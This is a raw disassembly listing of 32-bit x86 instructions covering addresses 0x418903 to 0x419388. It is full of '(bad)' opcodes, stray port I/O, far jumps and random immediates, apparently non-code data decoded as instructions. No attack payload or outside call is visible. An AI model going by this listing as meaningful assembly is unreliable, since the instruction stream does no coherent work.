  418903:	xor    al,0x77
  418905:	call   0x7a9d72e8
  41890a:	jmp    0x41891a
  41890c:	rol    BYTE PTR [eax+edi*1],0xf6
  418910:	fisub  WORD PTR [eax]
  418912:	or     eax,0x6483caeb
  418917:	not    DWORD PTR [edx-0x46519f75]
  41891d:	cmp    DWORD PTR [esp+esi*8+0x3c64030e],edx
  418924:	call   0xec9b8620
  418929:	rcl    dh,1
  41892b:	mov    al,ds:0x8c5dca8b
  418930:	in     al,dx
  418931:	int    0x86
  418933:	push   ecx
  418934:	add    esi,DWORD PTR [ebp+0x8b7f3f6]
  41893a:	(bad)  
  41893b:	mov    edx,0x9e95c7a0
  418940:	mov    ebp,0x31eb6613
  418945:	test   BYTE PTR [ecx+0x67f47103],bl
  41894b:	(bad)  
  41894c:	mov    WORD PTR [esi-0x27],ss
  41894f:	or     esi,eax
  418951:	shr    DWORD PTR [ebp+0x74],1
  418954:	pop    esi
  418955:	fstp   DWORD PTR [ecx-0x61560588]
  41895b:	fst    QWORD PTR [ebp-0x4c86e55f]
  418961:	inc    edx
  418962:	fbld   TBYTE PTR [edx]
  418964:	dec    edi
  418965:	(bad)  
  418966:	std    
  418967:	retf   
  418968:	or     al,0x7b
  41896a:	sub    BYTE PTR [ebp-0x8],dh
  41896d:	call   0x8fda:0x8cd99214
  418974:	ins    BYTE PTR es:[edi],dx
  418975:	inc    esi
  418976:	imul   ebp,DWORD PTR [edi],0xffffffeb
  418979:	pusha  
  41897a:	(bad)  
  41897b:	repnz dec edi
  41897d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41897e:	fsubr  DWORD PTR [esi-0x419481fc]
  418984:	dec    eax
  418985:	out    dx,al
  418986:	or     al,0x81
  418988:	and    BYTE PTR [eax],dh
  41898a:	out    0x95,eax
  41898c:	aam    0x39
  41898e:	mov    ds:0x85619f07,al
  418993:	or     eax,edi
  418995:	iret   
  418996:	popf   
  418997:	scas   al,BYTE PTR es:[edi]
  418998:	push   ebp
  418999:	dec    ecx
  41899a:	test   al,0x31
  41899c:	pop    edi
  41899d:	xor    BYTE PTR es:0xa5f6be97,bh
  4189a4:	pop    edi
  4189a5:	(bad)  
  4189a6:	into   
  4189a7:	sbb    bl,BYTE PTR [esi-0x104ba05d]
  4189ad:	mov    DWORD PTR [eax+0xc53abe6],edx
  4189b3:	lea    edi,[eax-0x9a66957]
  4189b9:	(bad)  [esi+0xa7aeedc]
  4189bf:	mov    bl,0x2c
  4189c1:	xchg   DWORD PTR [eax],eax
	...
  418a33:	add    BYTE PTR [edi],ch
  418a35:	stos   DWORD PTR es:[edi],eax
  418a36:	cdq    
  418a37:	inc    ecx
  418a38:	popf   
  418a39:	jae    0x418a3a
  418a3b:	out    dx,eax
  418a3c:	inc    esp
  418a3d:	dec    edi
  418a3e:	(bad)  
  418a3f:	clc    
  418a40:	mov    ds:0xfc5c21c1,al
  418a45:	or     eax,DWORD PTR [ecx]
  418a47:	add    dh,dh
  418a49:	add    BYTE PTR [eax],al
  418a4b:	add    BYTE PTR [edx+0x21],ch
  418a4e:	pop    ss
  418a4f:	mov    cl,0x9f
  418a51:	jae    0x418a23
  418a53:	cmp    DWORD PTR [eax+0x3bace2],ebp
  418a59:	pop    esp
  418a5a:	pop    esi
  418a5b:	imul   eax,DWORD PTR [esi+esi*4+0x37],0x80a3d303
  418a63:	jle    0x4189e5
  418a65:	ret    0x1532
  418a68:	sar    BYTE PTR [ebx+0x1e95b132],cl
  418a6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a6f:	jg     0x418a95
  418a71:	inc    esp
  418a72:	and    esp,eax
  418a74:	push   es
  418a75:	mov    al,ds:0xebdb36bc
  418a7a:	fucomip st,st(1)
  418a7c:	scas   al,BYTE PTR es:[edi]
  418a7d:	aas    
  418a7e:	cdq    
  418a7f:	or     ebx,DWORD PTR [ebp-0x1f]
  418a82:	pusha  
  418a83:	ss inc eax
  418a85:	aaa    
  418a86:	ja     0x418a43
  418a88:	add    BYTE PTR ds:0x656c5d57,al
  418a8e:	jmp    0xd849:0x160ed2
  418a95:	enter  0x14e3,0xe6
  418a99:	adc    DWORD PTR [edx],ebx
  418a9b:	lods   al,BYTE PTR ds:[esi]
  418a9c:	push   es
  418a9d:	lea    edx,[eax]
  418a9f:	sbb    eax,0x558bb08a
  418aa4:	loop   0x418a70
  418aa6:	sub    BYTE PTR [ecx-0x7d8fff46],ah
  418aac:	(bad)  
  418aae:	push   ss
  418aaf:	(bad)  
  418ab0:	hlt    
  418ab1:	push   0x2083a340
  418ab6:	aas    
  418ab7:	jmp    0x5926:0xc66801d5
  418abe:	(bad)  [edx+edx*4]
  418ac1:	std    
  418ac2:	add    cl,dl
  418ac4:	cdq    
  418ac5:	dec    edi
  418ac6:	jle    0x418ab0
  418ac8:	imul   esi,DWORD PTR [ecx],0x73
  418acb:	add    bh,ah
  418acd:	add    BYTE PTR [edi+0x7e],bl
  418ad0:	rol    edi,0xb0
  418ad3:	je     0x418b49
  418ad5:	or     edx,DWORD PTR [edi+0x6]
  418ad8:	lods   eax,DWORD PTR ds:[esi]
  418ad9:	add    ah,BYTE PTR [ecx]
  418adb:	fldenv [ebx+ebp*1-0x7c]
  418adf:	imul   esi,DWORD PTR [edi],0xc5b91737
  418ae5:	fmul   DWORD PTR [ecx]
  418ae7:	lods   al,BYTE PTR ds:[esi]
  418ae8:	dec    edx
  418ae9:	sub    DWORD PTR ds:0x86f94429,esi
  418aef:	xchg   DWORD PTR [edi-0x2d],ecx
  418af2:	xor    eax,0x5c02a2a2
  418af7:	sbb    BYTE PTR [ebx-0x6625ec26],al
  418afd:	jmp    0x418a9e
  418aff:	push   ebx
  418b00:	cmc    
  418b01:	jmp    0x77ab:0x288b3987
  418b08:	loope  0x418aa0
  418b0a:	pop    eax
  418b0b:	push   0x6a
  418b0d:	cmp    edx,DWORD PTR [esi-0x301ab30e]
  418b13:	or     al,0x1d
  418b15:	cld    
  418b16:	js     0x418aa4
  418b18:	pop    esi
  418b19:	repz js 0x418b6f
  418b1c:	js     0x418b38
  418b1e:	(bad)  [esi-0x19]
  418b21:	dec    ebp
  418b22:	jle    0x418b73
  418b24:	dec    eax
  418b25:	jae    0x418ba1
  418b27:	adc    al,0x5a
  418b29:	xor    ch,BYTE PTR [eax+0x33]
  418b2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b2d:	push   ds
  418b2e:	sub    eax,0x86705193
  418b33:	out    dx,eax
  418b34:	dec    esi
  418b35:	stc    
  418b36:	lock sbb DWORD PTR [eax+eax*2+0x67f13355],0x466f8b8f
	...
  418bb2:	add    BYTE PTR [eax],al
  418bb4:	mov    eax,eax
  418bb6:	nop
  418bb7:	test   cl,bl
  418bb9:	aam    0x9d
  418bbb:	int    0x19
  418bbd:	xchg   edx,eax
  418bbe:	clc    
  418bbf:	(bad)  
  418bc0:	adc    eax,0xf2d467c4
  418bc5:	or     al,0x1
  418bc7:	add    dh,dh
  418bc9:	add    BYTE PTR [eax],al
  418bcb:	add    BYTE PTR [edx+ebp*2],al
  418bce:	mov    ecx,0x20ff2a13
  418bd3:	in     al,0x4
  418bd5:	stc    
  418bd6:	int    0xd4
  418bd8:	test   BYTE PTR [edi-0x66086fc3],bh
  418bde:	mov    dh,0xf9
  418be0:	xor    bl,BYTE PTR [ecx]
  418be2:	ins    BYTE PTR es:[edi],dx
  418be3:	push   ebp
  418be4:	dec    ecx
  418be5:	icebp  
  418be6:	(bad)  
  418be7:	cmp    BYTE PTR [ebx-0x4b],dh
  418bea:	mov    ecx,0x10ca9b0e
  418bef:	(bad)  
  418bf1:	outs   dx,BYTE PTR ds:[esi]
  418bf2:	cmc    
  418bf3:	retf   0x7042
  418bf6:	sub    DWORD PTR [ecx-0x4bd0fe62],ebp
  418bfc:	ss push 0x8c95b331
  418c02:	push   edx
  418c03:	adc    al,BYTE PTR [esp+ecx*2-0x4962f633]
  418c0a:	outs   dx,BYTE PTR ds:[esi]
  418c0b:	in     al,dx
  418c0c:	out    0xe8,al
  418c0e:	mov    ecx,0x2ad8546f
  418c13:	lods   eax,DWORD PTR ds:[esi]
  418c14:	and    edi,DWORD PTR [edi+0x70]
  418c17:	(bad)  
  418c18:	iret   
  418c19:	ja     0x418c0b
  418c1b:	sbb    edi,DWORD PTR [ebp-0x6d]
  418c1e:	and    bh,BYTE PTR [ebp+0x12]
  418c21:	push   esi
  418c22:	loopne 0x418c0f
  418c24:	jbe    0x418ca4
  418c26:	shr    ebp,1
  418c28:	in     al,dx
  418c29:	jo     0x418beb
  418c2b:	mov    dl,0x74
  418c2d:	jge    0x418c4a
  418c2f:	xor    dh,BYTE PTR [edx+0x223df7cc]
  418c35:	leave  
  418c36:	nop
  418c37:	jle    0x418c02
  418c39:	in     eax,0x76
  418c3b:	ja     0x418c07
  418c3d:	sub    BYTE PTR [ebp+0x14],ah
  418c40:	push   cs
  418c41:	scas   eax,DWORD PTR es:[edi]
  418c42:	mov    ch,0x88
  418c44:	std    
  418c45:	imul   edi,DWORD PTR [ebp+eax*1-0x70],0x8ada137a
  418c4d:	aas    
  418c4e:	or     esp,DWORD PTR [edx+0x445bab68]
  418c54:	mov    BYTE PTR [ebp+0x22],0x54
  418c58:	arpl   bx,dx
  418c5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c5b:	xor    esi,DWORD PTR [ebp-0x22327aa3]
  418c61:	xchg   edx,eax
  418c62:	inc    edi
  418c63:	inc    eax
  418c64:	inc    esi
  418c65:	fs adc al,0xfa
  418c68:	mov    eax,ds:0xf9b7203
  418c6d:	sbb    eax,0x10dcb9cf
  418c72:	push   ecx
  418c73:	adc    BYTE PTR [eax-0xf71d5e0],ch
  418c79:	ret    
  418c7a:	mov    ebp,edi
  418c7c:	xlat   BYTE PTR ds:[ebx]
  418c7d:	adc    DWORD PTR [ebx],0x5957066b
  418c83:	xchg   esp,eax
  418c84:	and    eax,0x379288ee
  418c89:	je     0x418c1d
  418c8b:	pop    esp
  418c8c:	push   esi
  418c8d:	rsm    
  418c8f:	jl     0x418cb0
  418c91:	jb     0x418ccc
  418c93:	imul   ebp,DWORD PTR [esi],0xffffffd5
  418c96:	pop    esi
  418c97:	or     ebp,0xffffffbb
  418c9a:	and    al,0xe8
  418c9c:	aaa    
  418c9d:	push   edi
  418c9e:	ret    0x4aaa
  418ca1:	mov    esp,0x39432b00
  418ca6:	push   ds
  418ca7:	out    dx,eax
  418ca8:	mov    dl,0xed
  418caa:	xchg   ecx,eax
  418cab:	sub    eax,0x710302f4
  418cb0:	dec    esi
  418cb1:	inc    edx
  418cb2:	retf   0x49ba
  418cb5:	jg     0x418cb2
  418cb7:	pop    ecx
  418cb8:	inc    BYTE PTR ds:0x4ed820c5
  418cbe:	xlat   BYTE PTR ds:[ebx]
  418cbf:	cmp    BYTE PTR [edi-0x5],0x0
	...
  418d33:	add    BYTE PTR [edi],dl
  418d35:	arpl   WORD PTR ds:0x5f7f7d53,bx
  418d3b:	addr16 in eax,dx
  418d3d:	inc    eax
  418d3e:	jmp    0x404f0861
  418d43:	jg     0x418d2d
  418d45:	or     eax,0xf60001
  418d4a:	add    BYTE PTR [eax],al
  418d4c:	cmp    DWORD PTR [esi],ebp
  418d4e:	push   cs
  418d4f:	les    esp,FWORD PTR [edx-0x62bc8f59]
  418d55:	std    
  418d56:	ret    0xa968
  418d59:	aam    0x82
  418d5b:	in     eax,dx
  418d5c:	sub    ebp,ebp
  418d5e:	xchg   ecx,eax
  418d5f:	ror    BYTE PTR [ebx],cl
  418d61:	repz adc dh,ah
  418d64:	mov    ebp,0x166377b
  418d69:	popf   
  418d6a:	nop
  418d6b:	or     al,0xc4
  418d6d:	enter  0xcfa6,0xd2
  418d71:	arpl   WORD PTR [ebx+0x10],sp
  418d74:	retf   0x5972
  418d77:	pop    esi
  418d78:	push   0x3c9ae37b
  418d7d:	mov    ds:0x699cb6b2,al
  418d82:	inc    edx
  418d83:	cmp    cl,BYTE PTR [edi+0x22]
  418d86:	push   esi
  418d87:	jns    0x418d5a
  418d89:	repnz scas al,BYTE PTR es:[edi]
  418d8b:	cmp    eax,0xd57aacc6
  418d90:	or     BYTE PTR [esi],0xd9
  418d93:	inc    esi
  418d94:	sahf   
  418d95:	mov    BYTE PTR ds:0x1bf7ba7e,cl
  418d9b:	shl    ebp,0x95
  418d9e:	lea    eax,[edi]
  418da0:	imul   ebx,ebx,0xce953f81
  418da6:	fwait
  418da7:	xchg   ebx,eax
  418da8:	mov    al,ds:0xac17593f
  418dad:	mov    ds:0x4e4c2ba3,al
  418db2:	mov    eax,0xb79aa178
  418db7:	push   0x873831c3
  418dbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418dbd:	add    bl,cl
  418dbf:	daa    
  418dc0:	out    0x3a,eax
  418dc2:	and    ah,BYTE PTR [eax]
  418dc4:	cmp    DWORD PTR [esi],ecx
  418dc6:	test   eax,0x791d5bff
  418dcb:	call   FWORD PTR [ebx+eiz*8+0x16c0ccbc]
  418dd2:	xchg   ecx,eax
  418dd3:	inc    esp
  418dd4:	inc    eax
  418dd5:	jbe    0x418dab
  418dd7:	sbb    ebx,DWORD PTR [eax+0x27]
  418dda:	mov    ebx,0x2f637fe2
  418ddf:	(bad)  
  418de0:	mov    esi,0x3fdfaf5f
  418de5:	ja     0x418e5d
  418de7:	or     al,0xa4
  418de9:	sar    ch,cl
  418deb:	and    DWORD PTR [ebx],ebx
  418ded:	lahf   
  418dee:	and    ch,ah
  418df0:	arpl   sp,dx
  418df2:	xor    DWORD PTR [esi+0x10],esp
  418df5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418df6:	popa   
  418df7:	and    al,0x71
  418df9:	shr    BYTE PTR [esp+edi*4],1
  418dfc:	or     ebp,esp
  418dfe:	mov    ecx,0x96dc66bd
  418e03:	dec    BYTE PTR [edx+0x5cef2ac1]
  418e09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e0a:	adc    eax,0xcdc9874f
  418e0f:	mul    DWORD PTR [ebx+ecx*2-0x28]
  418e13:	xchg   esp,eax
  418e14:	test   BYTE PTR [esi-0x52],al
  418e17:	jp     0x418e00
  418e19:	sub    eax,0x2cadd71a
  418e1e:	add    al,0xb9
  418e20:	ins    BYTE PTR es:[edi],dx
  418e21:	and    eax,0xaf8ed068
  418e26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418e27:	jp     0x418e7b
  418e29:	cmp    al,0x81
  418e2b:	inc    esi
  418e2c:	push   esi
  418e2d:	sbb    dl,BYTE PTR [ecx+edi*4+0x2a]
  418e31:	mov    dh,0xea
  418e33:	fdiv   QWORD PTR [edi-0x71]
  418e36:	sbb    DWORD PTR [eax],edi
  418e38:	push   ss
  418e39:	popf   
  418e3a:	aas    
  418e3b:	out    0x2d,al
  418e3d:	js     0x418e7e
  418e3f:	cmp    BYTE PTR [ebx-0x1a],0x0
	...
  418eb3:	add    BYTE PTR [edx-0x1a],ah
  418eb6:	out    0x3b,al
  418eb8:	out    0x3b,al
  418eba:	(bad)  
  418ebb:	push   DWORD PTR [eax-0x20]
  418ebe:	jecxz  0x418eb9
  418ec0:	add    DWORD PTR [edx],ebx
  418ec2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ec3:	inc    esp
  418ec4:	fimul  WORD PTR [esi]
  418ec6:	add    DWORD PTR [eax],eax
  418ec8:	test   BYTE PTR [eax],0x0
  418ecb:	add    BYTE PTR ds:0x1bedb022,dl
  418ed1:	dec    edx
  418ed2:	jge    0x418f04
  418ed4:	mov    dh,0xce
  418ed7:	push   0xffffffc2
  418ed9:	sub    edi,DWORD PTR [ecx-0x517c352e]
  418edf:	sbb    bh,ah
  418ee1:	sub    esp,ebx
  418ee3:	in     al,dx
  418ee4:	cmc    
  418ee5:	xlat   BYTE PTR ds:[ebx]
  418ee6:	in     eax,dx
  418ee7:	ja     0x418ea2
  418ee9:	mov    cl,0xe3
  418eeb:	inc    ebp
  418eec:	push   edi
  418eed:	lahf   
  418eee:	pop    edi
  418eef:	in     eax,0xda
  418ef1:	pop    ecx
  418ef2:	lods   eax,DWORD PTR ds:[esi]
  418ef3:	mov    dl,0x15
  418ef5:	call   0xae5f:0x64e459ce
  418efc:	dec    ecx
  418efd:	sti    
  418efe:	mov    ds:0xac98d9af,al
  418f03:	dec    esi
  418f04:	push   ebx
  418f05:	dec    eax
  418f06:	(bad)  
  418f07:	xor    esp,DWORD PTR [edi]
  418f09:	in     eax,0x25
  418f0b:	inc    ebp
  418f0c:	cmp    ah,BYTE PTR [eax+ecx*1-0x22]
  418f10:	add    BYTE PTR [edi+0x61],al
  418f13:	(bad)  
  418f14:	retf   0x7d06
  418f17:	inc    edi
  418f18:	xchg   esp,eax
  418f19:	enter  0xdae6,0x7
  418f1d:	cmp    al,0xcd
  418f1f:	int3   
  418f20:	add    al,0xb5
  418f22:	prefetchnta BYTE PTR [eax+eiz*8]
  418f26:	xor    DWORD PTR [ecx+ebx*1],ebx
  418f29:	jb     0x418f4c
  418f2b:	adc    al,0x84
  418f2d:	aas    
  418f2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418f2f:	fst    QWORD PTR [ecx+edx*8]
  418f32:	xchg   ebp,eax
  418f33:	clc    
  418f34:	add    eax,0x7f2ec2e1
  418f39:	jl     0x418f0e
  418f3b:	jnp    0x418f4a
  418f3d:	test   BYTE PTR [edx],0x42
  418f40:	pusha  
  418f41:	les    ecx,FWORD PTR [ecx]
  418f43:	or     eax,0x11fbe61b
  418f48:	pop    esi
  418f49:	dec    edx
  418f4a:	xchg   BYTE PTR [esi-0x226eaf40],al
  418f50:	js     0x418fa0
  418f52:	les    esp,FWORD PTR [ecx-0x24]
  418f55:	inc    eax
  418f56:	cmp    esp,DWORD PTR [ebx-0x17]
  418f59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f5a:	dec    edi
  418f5b:	out    dx,al
  418f5c:	xchg   edi,eax
  418f5d:	add    eax,0x63460d40
  418f62:	ret    
  418f63:	jp     0x418ef8
  418f65:	adc    eax,0x6d541e27
  418f6a:	in     eax,0xad
  418f6c:	cwde   
  418f6d:	sbb    al,0x88
  418f6f:	jmp    0x1f9a:0x55427e5a
  418f76:	ins    DWORD PTR es:[edi],dx
  418f77:	inc    eax
  418f78:	dec    edx
  418f79:	sbb    eax,0x99c38c09
  418f7e:	mov    ah,BYTE PTR fs:[ebx]
  418f81:	icebp  
  418f82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f83:	and    eax,0xc2fa9867
  418f88:	call   ebx
  418f8a:	hlt    
  418f8b:	or     al,0xc1
  418f8d:	outs   dx,DWORD PTR ds:[esi]
  418f8e:	mov    ah,0xdc
  418f90:	cdq    
  418f91:	xchg   ebx,eax
  418f92:	cmp    eax,0x523b4a64
  418f97:	xchg   ecx,eax
  418f98:	pop    esi
  418f99:	in     al,dx
  418f9a:	aaa    
  418f9b:	jge    0x418f2f
  418f9d:	loop   0x418f36
  418f9f:	lods   eax,DWORD PTR ds:[esi]
  418fa0:	xor    DWORD PTR ds:0x8e764f69,esp
  418fa6:	aam    0xba
  418fa8:	sbb    esp,edx
  418faa:	cmp    BYTE PTR [ebx],0x76
  418fad:	mov    es,WORD PTR [edi]
  418faf:	jmp    0x418ff1
  418fb1:	pop    ebx
  418fb2:	stos   BYTE PTR es:[edi],al
  418fb3:	fisttp WORD PTR [ecx]
  418fb5:	cli    
  418fb6:	loope  0x418fb7
  418fb8:	(bad)  
  418fb9:	sub    BYTE PTR [esp+ebx*4+0x36],bl
  418fbd:	cdq    
  418fbe:	mov    bl,0x99
  418fc0:	add    eax,0x14
	...
  419031:	add    BYTE PTR [eax],al
  419033:	add    BYTE PTR [ecx-0xba9482],ch
  419039:	push   ebp
  41903a:	scas   eax,DWORD PTR es:[edi]
  41903b:	(bad)  
  41903c:	out    dx,eax
  41903d:	mov    ch,0xb6
  41903f:	shl    ah,cl
  419041:	imul   ecx,DWORD PTR [edi+ebx*8+0x10fd4],0xfffffff6
  419049:	add    BYTE PTR [eax],al
  41904b:	add    BYTE PTR [eax],ch
  41904d:	int    0x4d
  41904f:	jle    0x41906f
  419051:	adc    al,0x7c
  419053:	or     al,0xcc
  419055:	dec    edi
  419056:	bnd js 0x418fe5
  419059:	and    eax,0xad5ea4d7
  41905e:	xchg   ecx,ecx
  419060:	xchg   edx,eax
  419061:	push   esp
  419062:	ret    
  419063:	add    ecx,edx
  419065:	add    al,0xbb
  419067:	(bad)  
  419068:	addr16 popf 
  41906a:	xor    DWORD PTR [eax*2+0x33b43c78],esp
  419071:	int    0x45
  419073:	hlt    
  419074:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419075:	frndint 
  419077:	mov    ds:0xa226f4ae,eax
  41907c:	cmp    DWORD PTR [edx-0x56],edi
  41907f:	js     0x4190a6
  419081:	into   
  419082:	inc    edx
  419083:	popf   
  419084:	fwait
  419085:	mov    eax,ds:0xbbfcc387
  41908a:	mov    DWORD PTR [edx+0x740a5450],esi
  419090:	call   eax
  419092:	sub    eax,0xd7a41d71
  419097:	dec    esp
  419098:	dec    esi
  419099:	outs   dx,BYTE PTR ds:[esi]
  41909a:	push   ebp
  41909b:	rcl    DWORD PTR [edx-0x4d22468e],cl
  4190a1:	mov    ah,0xa0
  4190a3:	shl    BYTE PTR [ecx+edx*1-0x53],cl
  4190a7:	xor    BYTE PTR [ebp-0x14],bl
  4190aa:	lods   al,BYTE PTR ds:[esi]
  4190ab:	jle    0x4190b3
  4190ad:	call   0xad3d:0x511da765
  4190b4:	inc    edx
  4190b5:	sub    DWORD PTR [esi+0x45],esp
  4190b8:	aam    0xc5
  4190ba:	pop    edi
  4190bb:	push   ebp
  4190bc:	jmp    0x97c:0x9c5de0d7
  4190c3:	xor    BYTE PTR [eax+eiz*1+0x14],bh
  4190c7:	imul   esp,DWORD PTR [ebx+0x63],0xfffffff2
  4190cb:	jnp    0x419111
  4190cd:	jne    0x419114
  4190cf:	or     cl,dh
  4190d1:	test   eax,0x65c63e40
  4190d6:	sbb    al,0x43
  4190d8:	cwde   
  4190d9:	dec    esi
  4190da:	fprem1 
  4190dc:	lods   al,BYTE PTR ds:[esi]
  4190dd:	leave  
  4190de:	pop    esi
  4190df:	add    al,0xc6
  4190e1:	outs   dx,DWORD PTR ds:[esi]
  4190e2:	mov    bh,0xa0
  4190e4:	dec    ebp
  4190e5:	ret    
  4190e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4190e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4190e8:	mov    edi,0x92dfc68b
  4190ed:	mov    ebp,0xb2005727
  4190f2:	cwde   
  4190f3:	cmp    ebx,edi
  4190f5:	mov    al,0xea
  4190f7:	rcr    BYTE PTR [esp+ebp*4-0x573314ab],1
  4190fe:	or     eax,0xdcde16fb
  419103:	mov    ebx,0x73789c56
  419108:	dec    esi
  419109:	aam    0x87
  41910b:	jns    0x41912f
  41910d:	pop    esi
  41910e:	sahf   
  41910f:	(bad)  
  419110:	mov    edi,0x2a9f26d8
  419115:	push   ebp
  419116:	lods   eax,DWORD PTR ds:[esi]
  419117:	xchg   DWORD PTR [eax+0x11],ecx
  41911a:	add    al,0x9f
  41911c:	lock int3 
  41911e:	mov    bh,0x25
  419120:	push   ebp
  419121:	sti    
  419122:	cmp    cl,ch
  419124:	dec    edx
  419125:	cli    
  419126:	inc    edx
  419127:	icebp  
  419128:	inc    edi
  419129:	push   es
  41912a:	push   edi
  41912b:	out    dx,eax
  41912c:	mov    WORD PTR [ecx],cs
  41912e:	ins    BYTE PTR es:[edi],dx
  41912f:	or     al,0xbc
  419131:	add    bl,cl
  419133:	mov    eax,ds:0xefd1ad3d
  419138:	and    al,0x3b
  41913a:	in     al,dx
  41913b:	aad    0x86
  41913d:	sti    
  41913e:	sbb    al,BYTE PTR [ecx]
  419140:	pusha  
  419141:	inc    BYTE PTR [eax]
	...
  4191b3:	add    BYTE PTR [edi],dh
  4191b5:	xchg   edx,eax
  4191b6:	and    al,0x83
  4191b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4191b9:	mov    bh,0xb7
  4191bb:	mov    dh,0xb3
  4191bd:	cmp    al,0x9b
  4191bf:	scas   eax,DWORD PTR es:[edi]
  4191c0:	adc    BYTE PTR [ebp+0x6d],al
  4191c3:	sub    eax,0x110ca
  4191c8:	test   BYTE PTR [eax],0x0
  4191cb:	add    BYTE PTR [esi-0x7d16e6bb],cl
  4191d1:	dec    esp
  4191d2:	dec    edx
  4191d3:	fisubr DWORD PTR [edx-0x78afe00a]
  4191d9:	in     al,0xcd
  4191db:	xchg   ebp,eax
  4191dc:	fs call 0x132b:0xde033641
  4191e4:	push   ss
  4191e5:	ja     0x4191af
  4191e7:	sub    BYTE PTR [edx+0x2c409bbe],bh
  4191ed:	mov    cl,0x47
  4191ef:	jp     0x4191f4
  4191f1:	in     al,dx
  4191f2:	popa   
  4191f3:	sub    eax,0x9a9c9be1
  4191f8:	js     0x41921f
  4191fa:	jbe    0x419202
  4191fc:	fst    st(0)
  4191fe:	inc    ebx
  4191ff:	xor    dh,0xf6
  419202:	and    BYTE PTR [edi+eiz*1],0x19
  419206:	xchg   DWORD PTR ss:[ecx+esi*1+0x35],ecx
  41920b:	add    dh,BYTE PTR [edi+eax*1+0x72e3f720]
  419212:	mov    al,0x1c
  419214:	es mov ch,0x7a
  419217:	clc    
  419218:	lock ins DWORD PTR es:[edi],dx
  41921a:	push   eax
  41921b:	das    
  41921c:	sbb    ah,BYTE PTR [ecx+0x64]
  41921f:	je     0x419282
  419221:	cmp    BYTE PTR [edx],0x52
  419224:	push   esp
  419225:	(bad)  
  419226:	gs nop
  419228:	jnp    0x4191f5
  41922a:	call   0x5bc1a682
  41922f:	fcmovnb st,st(3)
  419231:	inc    esp
  419232:	xchg   esp,eax
  419233:	scas   al,BYTE PTR es:[edi]
  419234:	lods   al,BYTE PTR ds:[esi]
  419235:	push   ebx
  419236:	dec    ecx
  419237:	(bad)  
  419238:	je     0x41925b
  41923a:	jmp    0xc2e321d2
  41923f:	sbb    ecx,DWORD PTR [edi-0x22]
  419242:	gs jl  0x4191e7
  419245:	(bad)  
  419246:	lahf   
  419247:	in     al,0xe9
  419249:	inc    ebp
  41924a:	rcr    DWORD PTR [edx+esi*2-0x73],0xee
  41924f:	push   edi
  419250:	push   ecx
  419251:	xchg   edx,eax
  419252:	jp     0x419215
  419254:	aam    0x4b
  419256:	outs   dx,BYTE PTR ds:[esi]
  419257:	mov    esp,DWORD PTR [ebp+ebx*1-0x1e]
  41925b:	fst    DWORD PTR [eax]
  41925d:	xchg   esp,edi
  41925f:	in     eax,0x93
  419261:	stos   BYTE PTR es:[edi],al
  419262:	xor    al,BYTE PTR [eax-0x14b53685]
  419268:	in     eax,0xdb
  41926a:	xchg   ecx,eax
  41926b:	jl     0x4192d9
  41926d:	les    eax,FWORD PTR fs:[ebp-0x1dfa912e]
  419274:	add    ch,cl
  419276:	ins    DWORD PTR es:[edi],dx
  419277:	icebp  
  419278:	and    eax,0xc6cec4e2
  41927d:	cmc    
  41927e:	hlt    
  41927f:	inc    ebx
  419280:	xor    ecx,DWORD PTR [edi+ebp*8-0x12a072a3]
  419287:	mov    BYTE PTR [edi-0x15],bl
  41928a:	lds    ebp,FWORD PTR [ebx+ebp*1+0x29]
  41928e:	jle    0x4192d1
  419290:	scas   eax,DWORD PTR es:[edi]
  419291:	popa   
  419292:	cld    
  419293:	sti    
  419294:	pop    ebx
  419295:	adc    DWORD PTR ds:0x3069fb3c,esp
  41929b:	push   ebp
  41929c:	xchg   esp,eax
  41929d:	daa    
  41929e:	pop    ds
  41929f:	js     0x4192bc
  4192a1:	mov    ds:0x14350aec,eax
  4192a6:	data16 cmps BYTE PTR ds:[si],BYTE PTR es:[di]
  4192a9:	into   
  4192aa:	jae    0x41928f
  4192ac:	mov    bl,0x69
  4192ae:	icebp  
  4192af:	and    eax,DWORD PTR [edx]
  4192b1:	aad    0xce
  4192b3:	dec    ebp
  4192b4:	les    ebx,FWORD PTR [eax+eax*2+0x2d]
  4192b8:	ss loopne 0x41928e
  4192bb:	pop    ds
  4192bc:	in     al,dx
  4192bd:	push   cs
  4192be:	cmp    al,0x62
  4192c0:	sbb    ah,BYTE PTR [eax+eax*1+0x0]
	...
  419334:	fdiv   QWORD PTR [ebx-0x2380afc1]
  41933a:	(bad)  
  41933b:	mov    edi,0xbcd03e15
  419340:	jl     0x4192d7
  419342:	push   eax
  419343:	inc    esp
  419344:	rcl    BYTE PTR [ecx],0x1
  419347:	add    dh,dh
  419349:	add    BYTE PTR [eax],al
  41934b:	add    bl,al
  41934d:	cmp    BYTE PTR [edi*2-0x64a160c],ah
  419354:	inc    esi
  419355:	xor    esp,ebp
  419357:	int3   
  419358:	sub    DWORD PTR ds:0xec8ac60,ebx
  41935e:	outs   dx,BYTE PTR ds:[esi]
  41935f:	ins    BYTE PTR es:[edi],dx
  419360:	sti    
  419361:	adc    DWORD PTR [esi+ebp*1+0x454c8a44],ebp
  419368:	add    ecx,DWORD PTR [ebp-0x45f751e2]
  41936e:	in     al,dx
  41936f:	ds out 0x54,al
  419372:	lds    esp,FWORD PTR [edi+0x36]
  419375:	arpl   WORD PTR [ecx],cx
  419377:	hlt    
  419378:	add    DWORD PTR [ebp+0x713f4d96],eax
  41937e:	nop
  41937f:	xchg   esp,eax
  419380:	leave  
  419381:	sbb    bl,BYTE PTR [edx+0xc]
  419384:	int    0x3a
  419386:	in     eax,0xe8
  419388:	rcl    DWORD PTR [ecx-0x6b],cl
